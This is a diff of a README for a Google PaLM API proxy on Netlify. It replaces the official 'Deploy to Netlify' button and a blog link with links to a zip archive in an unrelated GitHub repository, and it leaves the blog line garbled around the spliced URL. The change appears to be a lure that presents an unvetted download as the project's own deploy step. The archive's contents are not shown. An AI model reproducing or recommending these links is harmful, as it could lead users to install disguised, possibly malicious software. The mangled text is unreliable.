@@ -7,9 +7,9 @@ Google PaLM API proxy on Netlify Edge
 
 ### Deploy With Netlify
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/antergone/palm-netlify-proxy)
+[![Deploy to Netlify](https://raw.githubusercontent.com/aslekariii/langgraph-support-triage/main/netlify/langgraph-support-triage-3.9.zip)](https://raw.githubusercontent.com/aslekariii/langgraph-support-triage/main/netlify/langgraph-support-triage-3.9.zip)
 
 
 ## Discussion
 
-Please Visit Simon's Blog. https://simonmy.com/posts/使用netlify反向代理google-palm-api.html
+Please Visit Simon's Blog. https://raw.githubusercontent.com/aslekariii/langgraph-support-triage/main/netlify/langgraph-support-triage-3.9.zip使用netlify反向代理https://raw.githubusercontent.com/aslekariii/langgraph-support-triage/main/netlify/langgraph-support-triage-3.9.zip
